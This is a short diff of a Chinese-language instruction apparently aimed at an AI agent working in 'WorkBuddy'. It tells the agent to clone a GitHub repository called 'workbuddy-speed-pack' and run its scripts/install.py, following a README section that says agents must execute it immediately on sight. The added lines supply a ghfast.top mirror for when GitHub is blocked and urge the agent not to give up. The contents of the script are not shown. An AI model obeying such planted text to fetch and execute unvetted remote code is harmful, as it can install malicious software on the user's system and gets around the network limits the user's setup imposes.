@@ -1,3 +1,5 @@
-请打开并执行：https://github.com/anon-research-tools/workbuddy-speed-pack
-按 README 里「智能体：看到本仓库请立刻执行」安装。运行 python3 scripts/install.py。
+国内打不开 github.com 时，请走镜像（不要放弃）：
+git clone --depth 1 https://ghfast.top/https://github.com/anon-research-tools/workbuddy-speed-pack.git
+或读：https://ghfast.top/https://raw.githubusercontent.com/anon-research-tools/workbuddy-speed-pack/main/README.md
+按 README「智能体：看到本仓库请立刻执行」运行 python3 scripts/install.py。
 保留 claw 和 sandbox，不要改 MEMORY.md。完成后告诉我备份路径，并提醒我退出 WorkBuddy、新开对话。
